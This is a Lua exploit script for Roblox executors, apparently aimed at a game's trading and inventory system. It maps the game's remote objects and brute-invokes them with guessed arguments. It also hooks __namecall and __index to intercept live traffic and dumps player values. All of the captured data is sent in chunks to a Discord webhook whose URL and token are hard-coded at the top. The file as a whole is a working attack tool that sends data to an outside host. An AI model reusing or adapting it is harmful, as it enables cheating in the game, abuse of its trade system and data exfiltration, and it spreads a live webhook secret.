-- =============================================
-- [igc] AA RECON LOGGER v3
-- Keyword-targeted: Trade/Offer/Accept/Confirm
-- Request/Swap/Exchange/Unit/Inventory
-- Executor: Delta / KRNL / Fluxus / Synapse
-- =============================================

local WEBHOOK = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"

-- =============================================
-- EXECUTOR COMPAT
-- =============================================
local httpFn = (
    syn and syn.request
    or (KRNL_LOADED and http_request)
    or (fluxus and fluxus.request)
    or (Delta and Delta.request)
    or request
    or (http and http.request)
    or function() warn("[igc] no http fn") end
)

local function getExec()
    if syn            then return "Synapse X"  end
    if KRNL_LOADED    then return "KRNL"       end
    if fluxus         then return "Fluxus"     end
    if Delta          then return "Delta"      end
    if identifyexecutor then return identifyexecutor() end
    return "Unknown"
end

local EXEC = getExec()

-- =============================================
-- SERVICES
-- =============================================
local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local HS      = game:GetService("HttpService")
local TS      = game:GetService("TweenService")
local lp      = Players.LocalPlayer
local gui     = lp:WaitForChild("PlayerGui")

-- =============================================
-- KEYWORD TABLE
-- every filter runs through this exact list
-- =============================================
local KEYWORDS = {
    "trade",
    "offer",
    "accept",
    "confirm",
    "request",
    "swap",
    "exchange",
    "unit",
    "inventory",
    "inv",
}

local function isKW(s)
    if type(s) ~= "string" then return false end
    local lo = s:lower()
    for _, k in ipairs(KEYWORDS) do
        if lo:find(k) then return true end
    end
    return false
end

local function whichKW(s)
    if type(s) ~= "string" then return "" end
    local lo = s:lower()
    local hits = {}
    for _, k in ipairs(KEYWORDS) do
        if lo:find(k) then table.insert(hits, k) end
    end
    return table.concat(hits, ",")
end

-- =============================================
-- CAPTURE BUCKETS
-- =============================================
local LOG = {
    -- remotes whose NAME matches keywords
    kwRemotes    = {},

    -- ALL remotes (for full map)
    allRemotes   = {},

    -- RF invoke results (keyword-matched RFs only)
    invokeHits   = {},

    -- RF invoke results (brute all)
    invokeAll    = {},

    -- OnClientEvent from keyword-matched REs
    kwEvents     = {},

    -- ALL OnClientEvent
    allEvents    = {},

    -- namecall: keyword-matched paths
    ncHits       = {},

    -- namecall: ALL calls
    ncFull       = {},

    -- index hook: keyword key reads
    idxCatches   = {},

    -- instance scan: keyword-named objects + children
    kwInstances  = {},

    -- player folder values
    playerVals   = {},
}

-- =============================================
-- UTILS
-- =============================================
local function fmt(v, d)
    d = d or 0
    if d > 4 then return "..." end
    local t = type(v)
    if t == "string"  then return '"'..v:sub(1,150)..'"' end
    if t == "number" or t == "boolean" then return tostring(v) end
    if t == "table" then
        local out, n = {}, 0
        for k, val in pairs(v) do
            n = n + 1
            if n > 30 then table.insert(out,"..."); break end
            table.insert(out, tostring(k).."="..fmt(val,d+1))
        end
        return "{"..table.concat(out,", ").."}"
    end
    if t == "userdata" then
        local ok, nm = pcall(function() return v.Name end)
        return ok and "[Inst:"..nm.."]" or "[ud]"
    end
    return tostring(v)
end

local function ts() return os.date("%H:%M:%S") end

local function tag(s)
    -- returns keyword tag for display
    local kws = whichKW(s)
    return kws ~= "" and "⚡["..kws.."]" or ""
end

-- =============================================
-- PHASE 1 — FULL REMOTE MAP + KW FILTER
-- =============================================
local function mapRemotes()
    local roots = {
        RS,
        workspace,
        game:GetService("Players"),
    }
    for _, root in ipairs(roots) do
        pcall(function()
            for _, v in ipairs(root:GetDescendants()) do
                if v:IsA("RemoteFunction") or v:IsA("RemoteEvent") or v:IsA("BindableFunction") then
                    local entry = {
                        t    = ts(),
                        path = v:GetFullName(),
                        cls  = v.ClassName,
                        name = v.Name,
                        kws  = whichKW(v.Name),
                    }
                    table.insert(LOG.allRemotes, entry)
                    if isKW(v.Name) then
                        table.insert(LOG.kwRemotes, entry)
                        print("[igc] KW remote: ["..v.ClassName.."] "..v:GetFullName().." → "..entry.kws)
                    end
                end
            end
        end)
    end
    print("[igc] remote map: "..#LOG.allRemotes.." total, "..#LOG.kwRemotes.." keyword hits")
end

-- =============================================
-- PHASE 2 — TARGETED RF INVOKE
-- invokes keyword-matched RFs first
-- then brute-invokes everything else
-- =============================================
local function invokeRemotes()
    -- pass 1: keyword matched — try multiple arg combos
    for _, v in ipairs(RS:GetDescendants()) do
        if v:IsA("RemoteFunction") and isKW(v.Name) then
            local fp = v:GetFullName()
            local argSets = {
                {},
                {lp},
                {lp.UserId},
                {lp.Name},
                {"get"},
                {"fetch"},
                {true},
            }
            for _, argSet in ipairs(argSets) do
                task.spawn(function()
                    local ok, res = pcall(function()
                        return v:InvokeServer(table.unpack(argSet))
                    end)
                    if ok and res ~= nil then
                        local entry = {
                            t    = ts(),
                            path = fp,
                            args = fmt(argSet),
                            res  = fmt(res),
                            kws  = whichKW(v.Name),
                        }
                        table.insert(LOG.invokeHits, entry)
                        print("[igc] ⚡ KW invoke hit: "..fp.." → "..fmt(res):sub(1,100))
                    end
                end)
                task.wait(0.1)
            end
        end
    end

    -- pass 2: brute all RFs (no arg)
    task.delay(2, function()
        for _, v in ipairs(RS:GetDescendants()) do
            if v:IsA("RemoteFunction") then
                local fp = v:GetFullName()
                task.spawn(function()
                    local ok, res = pcall(function()
                        return v:InvokeServer()
                    end)
                    if ok and res ~= nil then
                        table.insert(LOG.invokeAll, {
                            t    = ts(),
                            path = fp,
                            res  = fmt(res),
                            kws  = whichKW(v.Name),
                        })
                    end
                end)
            end
        end
    end)
end

-- =============================================
-- PHASE 3 — EVENT LISTENERS
-- keyword-matched REs get priority logging
-- all others logged in background
-- =============================================
local evConns = {}

local function listenEvents()
    for _, v in ipairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local fp  = v:GetFullName()
            local kwm = isKW(v.Name)

            local conn = v.OnClientEvent:Connect(function(...)
                local args = {...}
                local entry = {
                    t    = ts(),
                    path = fp,
                    data = {},
                    kws  = whichKW(v.Name),
                }
                for i, a in ipairs(args) do
                    entry.data[i] = fmt(a)
                end

                table.insert(LOG.allEvents, entry)

                if kwm then
                    table.insert(LOG.kwEvents, entry)
                    print("[igc] ⚡ KW event: "..fp.." → "..table.concat(entry.data," | "):sub(1,100))
                end
            end)
            table.insert(evConns, conn)
        end
    end

    task.delay(45, function()
        for _, c in ipairs(evConns) do c:Disconnect() end
        print("[igc] events done — kw:"..#LOG.kwEvents.." all:"..#LOG.allEvents)
    end)

    print("[igc] listening "..#evConns.." RemoteEvents for 45s")
end

-- =============================================
-- PHASE 4 — NAMECALL HOOK
-- filters keyword paths into ncHits
-- logs everything into ncFull
-- =============================================
local oldNC

local function armNamecall()
    if not hookmetamethod then
        warn("[igc] hookmetamethod not available on "..EXEC)
        return false
    end

    oldNC = hookmetamethod(game, "__namecall", function(self, ...)
        if checkcaller and checkcaller() then
            return oldNC(self, ...)
        end

        local method = getnamecallmethod()
        local tracked = {
            InvokeServer   = true,
            FireServer     = true,
            InvokeClient   = true,
            FireClient     = true,
            FireAllClients = true,
        }

        if tracked[method] then
            local fp = "?"
            pcall(function() fp = self:GetFullName() end)

            local rets = table.pack(oldNC(self, ...))

            local entry = {
                t      = ts(),
                path   = fp,
                method = method,
                args   = {},
                rets   = {},
                kws    = whichKW(fp),
            }
            for i, a in ipairs({...}) do entry.args[i] = fmt(a) end
            for i = 1, rets.n do entry.rets[i] = fmt(rets[i]) end

            table.insert(LOG.ncFull, entry)

            if isKW(fp) then
                table.insert(LOG.ncHits, entry)
                print("[igc] ⚡ NC hit: "..fp.." "..method..(#entry.rets>0 and " → "..entry.rets[1] or ""))
            end

            return table.unpack(rets, 1, rets.n)
        end

        return oldNC(self, ...)
    end)

    print("[igc] namecall hook armed")
    return true
end

-- =============================================
-- PHASE 5 — INDEX HOOK
-- catches keyword table reads
-- =============================================
local oldIDX

local function armIndex()
    if not hookmetamethod then return false end

    oldIDX = hookmetamethod(game, "__index", function(self, key)
        if checkcaller and checkcaller() then return oldIDX(self, key) end

        local val = oldIDX(self, key)

        if isKW(key) and type(val) == "table" then
            local entry = {
                t   = ts(),
                key = key,
                val = fmt(val),
                kws = whichKW(key),
            }
            table.insert(LOG.idxCatches, entry)
            print("[igc] ⚡ IDX: key="..key.." → "..fmt(val):sub(1,80))
        end

        return val
    end)

    print("[igc] index hook armed")
    return true
end

-- =============================================
-- PHASE 6 — INSTANCE SCAN
-- keyword-named objects + full child dump
-- player folder value read
-- =============================================
local function scanInstances()
    local function deep(root, d)
        if d > 10 then return end
        for _, c in ipairs(root:GetChildren()) do
            pcall(function()
                if isKW(c.Name) then
                    local entry = {
                        t    = ts(),
                        path = c:GetFullName(),
                        cls  = c.ClassName,
                        kws  = whichKW(c.Name),
                        kids = {},
                        vals = {},
                    }
                    -- dump all children
                    for _, kid in ipairs(c:GetChildren()) do
                        table.insert(entry.kids, kid.Name.."["..kid.ClassName.."]")
                        -- if value object, grab value
                        if kid:IsA("ValueBase") then
                            table.insert(entry.vals, kid.Name.."="..tostring(kid.Value))
                        end
                        -- if it's a table/model, dump its children too
                        for _, gkid in ipairs(kid:GetChildren()) do
                            if gkid:IsA("ValueBase") then
                                table.insert(entry.vals, kid.Name.."."..gkid.Name.."="..tostring(gkid.Value))
                            end
                        end
                    end
                    table.insert(LOG.kwInstances, entry)
                    print("[igc] ⚡ Instance: "..c:GetFullName().." kids:"..#entry.kids)
                end
                deep(c, d+1)
            end)
        end
    end

    local roots = {RS, workspace, lp}
    local pgui = lp:WaitForChild("PlayerGui", 3)
    if pgui then table.insert(roots, pgui) end

    for _, root in ipairs(roots) do
        pcall(function() deep(root, 0) end)
    end

    -- grab all ValueBase under player
    pcall(function()
        local function grabVals(inst)
            for _, c in ipairs(inst:GetChildren()) do
                if c:IsA("ValueBase") then
                    table.insert(LOG.playerVals, {
                        path = c:GetFullName(),
                        cls  = c.ClassName,
                        val  = tostring(c.Value),
                        kws  = whichKW(c.Name),
                    })
                end
                grabVals(c)
            end
        end
        grabVals(lp)
    end)

    print("[igc] scan done — kw instances:"..#LOG.kwInstances.." player vals:"..#LOG.playerVals)
end

-- =============================================
-- WEBHOOK SENDER
-- =============================================
local function sendWH(title, lines, wh)
    if not wh or not wh:find("discord.com/api/webhooks") then return end
    local body = table.concat(lines, "\n")
    local chunks = {}
    for i = 1, #body, 1900 do
        table.insert(chunks, body:sub(i, i+1899))
    end
    for idx, chunk in ipairs(chunks) do
        local t2 = #chunks>1 and (title.." ["..idx.."/"..#chunks.."]") or title
        pcall(function()
            httpFn({
                Url    = wh,
                Method = "POST",
                Headers= {["Content-Type"]="application/json"},
                Body   = HS:JSONEncode({
                    username = "[igc] AA Logger v3",
                    embeds   = {{
                        title       = t2,
                        description = chunk,
                        color       = 0x2244FF,
                        footer      = { text = EXEC.." · "..lp.Name.." · "..lp.UserId }
                    }}
                })
            })
        end)
        if idx < #chunks then task.wait(1.2) end
    end
end

-- =============================================
-- REPORT BUILDER
-- =============================================
local function buildReports(wh)

    -- R1: KEYWORD REMOTES (most important — exact names)
    do
        local lines = {
            "**== ⚡ KEYWORD REMOTES: "..#LOG.kwRemotes.." ==**",
            "remotes matching: trade/offer/accept/confirm/request/swap/exchange/unit/inventory",
            "",
        }
        for _, r in ipairs(LOG.kwRemotes) do
            table.insert(lines, "⚡`["..r.cls.."]` **"..r.name.."**")
            table.insert(lines, "  path: `"..r.path.."`")
            table.insert(lines, "  matched: `"..r.kws.."`")
            table.insert(lines, "")
        end
        if #LOG.kwRemotes == 0 then
            table.insert(lines, "_no keyword remotes found — check if fully loaded_")
        end
        sendWH("AA v3 — ⚡ Keyword Remotes", lines, wh)
    end

    task.wait(1.5)

    -- R2: RF INVOKE HITS (keyword RFs + what they returned)
    do
        local lines = {
            "**== ⚡ RF Invoke Hits: "..#LOG.invokeHits.." ==**",
            "keyword RemoteFunctions that returned data",
            "",
        }
        for i, r in ipairs(LOG.invokeHits) do
            if i > 40 then table.insert(lines,"...+"..(#LOG.invokeHits-40).." more"); break end
            table.insert(lines, "⚡ **"..r.t.."** `"..r.path.."`")
            table.insert(lines, "  args: "..r.args)
            table.insert(lines, "  **→ "..r.res.."**")
            table.insert(lines, "")
        end
        if #LOG.invokeHits == 0 then
            table.insert(lines, "_no hits yet — interact with units/trade in-game then resend_")
        end
        sendWH("AA v3 — ⚡ RF Invoke Hits", lines, wh)
    end

    task.wait(1.5)

    -- R3: ALL RF RESULTS (brute)
    do
        local lines = {
            "**== All RF Results: "..#LOG.invokeAll.." ==**",
            "",
        }
        for i, r in ipairs(LOG.invokeAll) do
            if i > 40 then table.insert(lines,"...+"..(#LOG.invokeAll-40).." more"); break end
            local kw = r.kws ~= "" and "⚡" or "·"
            table.insert(lines, kw.." **"..r.t.."** `"..r.path.."`")
            table.insert(lines, "  → "..r.res)
        end
        sendWH("AA v3 — All RF Results", lines, wh)
    end

    task.wait(1.5)

    -- R4: KEYWORD NAMECALL HITS
    do
        local lines = {
            "**== ⚡ Namecall Hits: "..#LOG.ncHits.." ==**",
            "live traffic matching keywords",
            "",
        }
        for i, h in ipairs(LOG.ncHits) do
            if i > 50 then table.insert(lines,"...+"..(#LOG.ncHits-50).." more"); break end
            table.insert(lines, "⚡ **"..h.t.."** `"..h.path.."`")
            table.insert(lines, "  method: **"..h.method.."**  matched: `"..h.kws.."`")
            if #h.args > 0 then
                table.insert(lines, "  args: "..table.concat(h.args,", "))
            end
            if #h.rets > 0 then
                table.insert(lines, "  **→ "..table.concat(h.rets," | ").."**")
            end
            table.insert(lines, "")
        end
        if #LOG.ncHits == 0 then
            table.insert(lines, "_no hits yet — open inventory or initiate a trade_")
        end
        sendWH("AA v3 — ⚡ Namecall Hits", lines, wh)
    end

    task.wait(1.5)

    -- R5: KEYWORD EVENTS
    do
        local lines = {
            "**== ⚡ Keyword Events: "..#LOG.kwEvents.." ==**",
            "server→client fires on keyword remotes",
            "",
        }
        for i, e in ipairs(LOG.kwEvents) do
            if i > 40 then table.insert(lines,"...+"..(#LOG.kwEvents-40).." more"); break end
            table.insert(lines, "⚡ **"..e.t.."** `"..e.path.."` ["..e.kws.."]")
            if #e.data > 0 then
                table.insert(lines, "  **data: "..table.concat(e.data," | ").."**")
            end
            table.insert(lines, "")
        end
        if #LOG.kwEvents == 0 then
            table.insert(lines, "_no events yet — interact with trade/inventory_")
        end
        sendWH("AA v3 — ⚡ Keyword Events", lines, wh)
    end

    task.wait(1.5)

    -- R6: ALL EVENTS (full)
    do
        local lines = {
            "**== All Events: "..#LOG.allEvents.." ==**",
            "",
        }
        for i, e in ipairs(LOG.allEvents) do
            if i > 50 then table.insert(lines,"...+"..(#LOG.allEvents-50).." more"); break end
            local kw = e.kws ~= "" and "⚡" or "·"
            table.insert(lines, kw.." **"..e.t.."** `"..e.path.."`")
            if #e.data > 0 then
                table.insert(lines, "  "..table.concat(e.data," | "))
            end
        end
        sendWH("AA v3 — All Events", lines, wh)
    end

    task.wait(1.5)

    -- R7: KEYWORD INSTANCES (full child + value dump)
    do
        local lines = {
            "**== ⚡ Keyword Instances: "..#LOG.kwInstances.." ==**",
            "",
        }
        for i, u in ipairs(LOG.kwInstances) do
            if i > 30 then table.insert(lines,"...+"..(#LOG.kwInstances-30).." more"); break end
            table.insert(lines, "⚡ `"..u.path.."` ["..u.cls.."] matched:`"..u.kws.."`")
            if #u.kids > 0 then
                table.insert(lines, "  children: "..table.concat(u.kids, ", "))
            end
            if #u.vals > 0 then
                table.insert(lines, "  **values: "..table.concat(u.vals, " | ").."**")
            end
            table.insert(lines, "")
        end
        sendWH("AA v3 — ⚡ Keyword Instances", lines, wh)
    end

    task.wait(1.5)

    -- R8: PLAYER VALUES (all)
    do
        local lines = {
            "**== Player Values: "..#LOG.playerVals.." ==**",
            "",
        }
        for _, v in ipairs(LOG.playerVals) do
            local kw = v.kws ~= "" and "⚡" or "·"
            table.insert(lines, kw.." `"..v.path.."` ["..v.cls.."] = **"..v.val.."**")
        end
        if #LOG.playerVals == 0 then
            table.insert(lines, "_none found_")
        end
        sendWH("AA v3 — Player Values", lines, wh)
    end

    -- R9: INDEX CATCHES
    if #LOG.idxCatches > 0 then
        local lines = {
            "**== ⚡ Index Catches: "..#LOG.idxCatches.." ==**",
            "",
        }
        for i, c in ipairs(LOG.idxCatches) do
            if i > 30 then break end
            table.insert(lines, "⚡ **"..c.t.."** key=`"..c.key.."` ["..c.kws.."]")
            table.insert(lines, "  "..c.val)
            table.insert(lines, "")
        end
        sendWH("AA v3 — Index Catches", lines, wh)
    end

    -- R10: FULL REMOTE MAP
    do
        local lines = {
            "**== Full Remote Map: "..#LOG.allRemotes.." ==**",
            "",
        }
        for i, r in ipairs(LOG.allRemotes) do
            if i > 80 then table.insert(lines,"...+"..(#LOG.allRemotes-80).." more"); break end
            local kw = r.kws ~= "" and "⚡" or "·"
            table.insert(lines, kw.."`["..r.cls.."]` "..r.path)
        end
        sendWH("AA v3 — Full Remote Map", lines, wh)
    end
end

-- =============================================
-- UI
-- =============================================
if gui:FindFirstChild("AALoggerV3") then gui.AALoggerV3:Destroy() end

local SG = Instance.new("ScreenGui")
SG.Name="AALoggerV3"; SG.ResetOnSpawn=false; SG.Parent=gui

local Main = Instance.new("Frame")
Main.Size=UDim2.new(0,305,0,370)
Main.Position=UDim2.new(0.5,-152,0.5,-185)
Main.BackgroundColor3=Color3.fromRGB(8,8,18)
Main.BorderSizePixel=0; Main.Active=true; Main.Draggable=true; Main.Parent=SG
Instance.new("UICorner",Main).CornerRadius=UDim.new(0,8)
local ms=Instance.new("UIStroke",Main)
ms.Color=Color3.fromRGB(40,40,190); ms.Thickness=1

-- title bar
local TB=Instance.new("Frame")
TB.Size=UDim2.new(1,0,0,32); TB.BackgroundColor3=Color3.fromRGB(12,12,34)
TB.BorderSizePixel=0; TB.Parent=Main
Instance.new("UICorner",TB).CornerRadius=UDim.new(0,8)

local TL=Instance.new("TextLabel")
TL.Size=UDim2.new(1,-34,1,0); TL.Position=UDim2.new(0,10,0,0)
TL.BackgroundTransparency=1
TL.Text="[igc] AA Logger v3 — "..EXEC
TL.TextColor3=Color3.fromRGB(70,70,220); TL.TextSize=10
TL.Font=Enum.Font.Code; TL.TextXAlignment=Enum.TextXAlignment.Left; TL.Parent=TB

local XB=Instance.new("TextButton")
XB.Size=UDim2.new(0,20,0,20); XB.Position=UDim2.new(1,-26,0.5,-10)
XB.BackgroundColor3=Color3.fromRGB(130,20,20); XB.Text="✕"
XB.TextColor3=Color3.fromRGB(255,255,255); XB.TextSize=10
XB.Font=Enum.Font.GothamBold; XB.BorderSizePixel=0; XB.Parent=TB
Instance.new("UICorner",XB).CornerRadius=UDim.new(0,4)
XB.MouseButton1Click:Connect(function() SG:Destroy() end)

-- webhook
local function mklbl(txt, y)
    local l=Instance.new("TextLabel")
    l.Size=UDim2.new(1,-20,0,12); l.Position=UDim2.new(0,10,0,y)
    l.BackgroundTransparency=1; l.Text=txt
    l.TextColor3=Color3.fromRGB(100,100,155); l.TextSize=10
    l.Font=Enum.Font.Code; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=Main
    return l
end

mklbl("Webhook URL", 40)
local WHB=Instance.new("TextBox")
WHB.Size=UDim2.new(1,-20,0,24); WHB.Position=UDim2.new(0,10,0,53)
WHB.BackgroundColor3=Color3.fromRGB(11,11,26); WHB.Text=""
WHB.PlaceholderText="https://discord.com/api/webhooks/..."
WHB.TextColor3=Color3.fromRGB(150,150,230)
WHB.PlaceholderColor3=Color3.fromRGB(55,55,95)
WHB.TextSize=10; WHB.Font=Enum.Font.Code
WHB.ClearTextOnFocus=false; WHB.BorderSizePixel=0; WHB.Parent=Main
Instance.new("UICorner",WHB).CornerRadius=UDim.new(0,4)
local whs=Instance.new("UIStroke",WHB); whs.Color=Color3.fromRGB(35,35,130); whs.Thickness=1

-- keyword display
mklbl("Active Keywords", 86)
local kwDisp=Instance.new("TextLabel")
kwDisp.Size=UDim2.new(1,-20,0,20); kwDisp.Position=UDim2.new(0,10,0,99)
kwDisp.BackgroundColor3=Color3.fromRGB(10,10,24); kwDisp.BorderSizePixel=0
kwDisp.Text="trade · offer · accept · confirm · request · swap · exchange · unit · inventory"
kwDisp.TextColor3=Color3.fromRGB(80,180,220); kwDisp.TextSize=9; kwDisp.Font=Enum.Font.Code
kwDisp.Parent=Main
Instance.new("UICorner",kwDisp).CornerRadius=UDim.new(0,4)

-- counters
local function mkCounter(lbl, x, y, w)
    local F=Instance.new("Frame")
    F.Size=UDim2.new(0,w,0,36); F.Position=UDim2.new(0,x,0,y)
    F.BackgroundColor3=Color3.fromRGB(10,10,24); F.BorderSizePixel=0; F.Parent=Main
    Instance.new("UICorner",F).CornerRadius=UDim.new(0,4)
    local NL=Instance.new("TextLabel")
    NL.Size=UDim2.new(1,0,0.55,0); NL.BackgroundTransparency=1
    NL.Text="0"; NL.TextColor3=Color3.fromRGB(80,210,120)
    NL.TextSize=15; NL.Font=Enum.Font.GothamBold; NL.Parent=F
    local LL=Instance.new("TextLabel")
    LL.Size=UDim2.new(1,0,0.45,0); LL.Position=UDim2.new(0,0,0.55,0)
    LL.BackgroundTransparency=1; LL.Text=lbl
    LL.TextColor3=Color3.fromRGB(75,75,130); LL.TextSize=9; LL.Font=Enum.Font.Code; LL.Parent=F
    return NL
end

local c_kwR  = mkCounter("⚡ remotes",  10, 128, 65)
local c_invH = mkCounter("⚡ rf hits",  80, 128, 65)
local c_kwE  = mkCounter("⚡ events",  150, 128, 65)
local c_ncH  = mkCounter("⚡ nc hits", 220, 128, 65)

task.spawn(function()
    while SG.Parent do
        c_kwR.Text  = tostring(#LOG.kwRemotes)
        c_invH.Text = tostring(#LOG.invokeHits)
        c_kwE.Text  = tostring(#LOG.kwEvents)
        c_ncH.Text  = tostring(#LOG.ncHits)
        task.wait(1)
    end
end)

-- phases
local phases = {
    {lbl="1 · Remote Map",         key="map"},
    {lbl="2 · Targeted RF Invoke", key="invoke"},
    {lbl="3 · Event Listeners",    key="events"},
    {lbl="4 · Namecall Hook",      key="nc"},
    {lbl="5 · Index Hook",         key="idx"},
    {lbl="6 · Instance Scan",      key="scan"},
}

local phaseUI = {}
for i, p in ipairs(phases) do
    local row=Instance.new("Frame")
    row.Size=UDim2.new(1,-20,0,15); row.Position=UDim2.new(0,10,0,172+(i-1)*17)
    row.BackgroundTransparency=1; row.Parent=Main

    local dot=Instance.new("Frame")
    dot.Size=UDim2.new(0,7,0,7); dot.Position=UDim2.new(0,0,0.5,-3.5)
    dot.BackgroundColor3=Color3.fromRGB(50,50,70); dot.BorderSizePixel=0; dot.Parent=row
    Instance.new("UICorner",dot).CornerRadius=UDim.new(0,4)

    local lbl2=Instance.new("TextLabel")
    lbl2.Size=UDim2.new(1,-14,1,0); lbl2.Position=UDim2.new(0,12,0,0)
    lbl2.BackgroundTransparency=1; lbl2.Text=p.lbl
    lbl2.TextColor3=Color3.fromRGB(90,90,135); lbl2.TextSize=10
    lbl2.Font=Enum.Font.Code; lbl2.TextXAlignment=Enum.TextXAlignment.Left; lbl2.Parent=row

    phaseUI[p.key]={dot=dot,lbl=lbl2}
end

local function setPhase(key, state)
    local ref = phaseUI[key]
    if not ref then return end
    if state == "run" then
        ref.dot.BackgroundColor3=Color3.fromRGB(230,170,20)
        ref.lbl.TextColor3=Color3.fromRGB(230,170,20)
    elseif state == "done" then
        ref.dot.BackgroundColor3=Color3.fromRGB(40,195,80)
        ref.lbl.TextColor3=Color3.fromRGB(40,195,80)
    end
end

-- status
local SL=Instance.new("TextLabel")
SL.Size=UDim2.new(1,-20,0,12); SL.Position=UDim2.new(0,10,0,278)
SL.BackgroundTransparency=1; SL.Text="paste webhook → arm → open inventory/trade → send"
SL.TextColor3=Color3.fromRGB(90,90,135); SL.TextSize=10
SL.Font=Enum.Font.Code; SL.TextXAlignment=Enum.TextXAlignment.Left; SL.Parent=Main

local function setStat(msg, good)
    SL.Text=msg
    SL.TextColor3=good==false and Color3.fromRGB(230,60,60) or Color3.fromRGB(55,200,95)
end

-- buttons
local armed = false

local ArmBtn=Instance.new("TextButton")
ArmBtn.Size=UDim2.new(0,130,0,28); ArmBtn.Position=UDim2.new(0,10,0,296)
ArmBtn.BackgroundColor3=Color3.fromRGB(25,25,150); ArmBtn.Text="[ ARM ]"
ArmBtn.TextColor3=Color3.fromRGB(170,170,255); ArmBtn.TextSize=11
ArmBtn.Font=Enum.Font.GothamBold; ArmBtn.BorderSizePixel=0; ArmBtn.Parent=Main
Instance.new("UICorner",ArmBtn).CornerRadius=UDim.new(0,5)

local SendBtn=Instance.new("TextButton")
SendBtn.Size=UDim2.new(0,145,0,28); SendBtn.Position=UDim2.new(0,150,0,296)
SendBtn.BackgroundColor3=Color3.fromRGB(18,95,38); SendBtn.Text="[ SEND REPORTS ]"
SendBtn.TextColor3=Color3.fromRGB(150,255,150); SendBtn.TextSize=11
SendBtn.Font=Enum.Font.GothamBold; SendBtn.BorderSizePixel=0; SendBtn.Parent=Main
Instance.new("UICorner",SendBtn).CornerRadius=UDim.new(0,5)

ArmBtn.MouseButton1Click:Connect(function()
    if armed then setStat("already armed ✓", true); return end
    local wh=WHB.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("set webhook first", false); return
    end
    armed=true
    ArmBtn.Text="[ ARMED ✓ ]"
    ArmBtn.BackgroundColor3=Color3.fromRGB(10,55,10)

    task.spawn(function()
        setPhase("map","run"); setStat("phase 1 — mapping remotes...", true)
        mapRemotes(); setPhase("map","done")

        setPhase("invoke","run"); setStat("phase 2 — invoking keyword RFs...", true)
        invokeRemotes(); task.wait(3); setPhase("invoke","done")

        setPhase("events","run"); setStat("phase 3 — listening events (45s)...", true)
        listenEvents(); setPhase("events","done")

        setPhase("nc","run"); setStat("phase 4 — namecall hook...", true)
        armNamecall(); setPhase("nc","done")

        setPhase("idx","run"); setStat("phase 5 — index hook...", true)
        armIndex(); setPhase("idx","done")

        setPhase("scan","run"); setStat("phase 6 — scanning instances...", true)
        scanInstances(); setPhase("scan","done")

        setStat("armed ✓ — open inventory, tap units, try a trade → then SEND", true)
    end)
end)

SendBtn.MouseButton1Click:Connect(function()
    local wh=WHB.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("invalid webhook", false); return
    end
    setStat("sending 10 reports...", true)
    SendBtn.Text="[ SENDING... ]"
    SendBtn.BackgroundColor3=Color3.fromRGB(10,50,10)
    task.spawn(function()
        buildReports(wh)
        setStat("done ✓ — paste output back to igc", true)
        SendBtn.Text="[ SEND REPORTS ]"
        SendBtn.BackgroundColor3=Color3.fromRGB(18,95,38)
    end)
end)

print("[igc] AA Logger v3 loaded on "..EXEC.." — keywords: "..table.concat(KEYWORDS,", "))
